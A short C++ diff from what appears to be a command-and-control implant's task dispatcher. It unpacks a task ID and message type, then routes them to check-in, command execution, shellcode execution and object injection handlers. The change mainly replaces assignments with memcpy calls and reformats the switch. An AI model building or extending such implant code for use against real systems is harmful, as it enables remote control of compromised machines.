@@ -213,14 +213,25 @@ namespace Dispatcher {
         Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
         Parser::UnpackDword(&parser);
 
-        Ctx->session.current_taskid = Parser::UnpackDword(&parser);
+        auto success = true;
+        auto task_id = Parser::UnpackDword(&parser);
 
+        x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
         __debugbreak();
+
         switch (Parser::UnpackDword(&parser)) {
-            case TypeCheckin:   Ctx->session.checkin = true; break;
-            case TypeTasking:   Memory::Execute::ExecuteCommand(parser); break;
-            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser); break;
-            case TypeObject:    Injection::LoadObject(parser); break;
+            case TypeCheckin:
+                x_memcpy(&Ctx->session.checkin, &success, sizeof(bool));
+                break;
+            case TypeTasking:
+                Memory::Execute::ExecuteCommand(parser);
+                break;
+            case TypeExecute:
+                Memory::Execute::ExecuteShellcode(parser);
+                break;
+            case TypeObject:
+                Injection::LoadObject(parser);
+                break;
 
             default:
                 break;
